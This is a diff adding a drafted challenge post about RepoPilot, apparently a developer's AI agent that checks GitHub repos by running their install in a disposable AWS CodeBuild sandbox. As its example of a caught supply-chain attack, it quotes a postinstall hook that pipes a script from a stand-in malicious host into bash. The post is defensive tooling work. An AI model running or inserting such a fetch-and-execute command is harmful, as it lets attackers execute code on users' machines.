@@ -1,0 +1,31 @@
+================================================================================
+BUILDER CENTER -> "Create a post"
+Post to: Weekend Challenge: Give your Agent a Tool  (participants only)
+Shorter, community-style. Title <=150. Copy Title + Body.
+================================================================================
+
+------------------------------------------------------------------- TITLE (<=150)
+My agent used to read a repo. I gave it one tool and now it runs the install in a disposable AWS sandbox
+
+================================================================================
+BODY  (paste everything below into the Markdown box)
+================================================================================
+
+For the challenge I took RepoPilot, an agent I already built that tells you if a GitHub repo is safe to run, and gave it one new tool.
+
+Before, every tool it had read the repo from the outside: the README, the manifests, the file list. That misses the dangerous part, the `postinstall` hook that fires the second you type `npm install`.
+
+The new tool, `run_in_sandbox`, actually runs the install inside a disposable AWS CodeBuild container, reads the real build log, and reports whether it succeeded plus any supply-chain danger it found. The container is thrown away after, so the untrusted code runs in AWS, never on my laptop.
+
+**The before and after, on the same sneaky repo:**
+- Before (reads it): "Looks fine." The hook is invisible to a reader.
+- After (runs it): "Caught it." The log shows the install piped `curl -s https://evil.example.com/i.sh | bash` into a shell.
+
+Both runs were validated against live AWS CodeBuild. The agent reasons with Amazon Bedrock (Nova Pro) through Strands; the new power is one Strands `@tool` backed by CodeBuild, with a least-privilege role and 9 offline unit tests.
+
+The live demo is a before/after toggle so you can flip v1 (reads it) and v2 (runs it) on a safe repo and a sneaky one yourself.
+
+- Live demo: https://simplynadaf.github.io/repopilot-sandbox-tool/
+- Code: https://github.com/simplynadaf/repopilot-sandbox-tool
+
+Everyone scans the repo. This agent runs it, in a disposable AWS box, so your laptop does not.
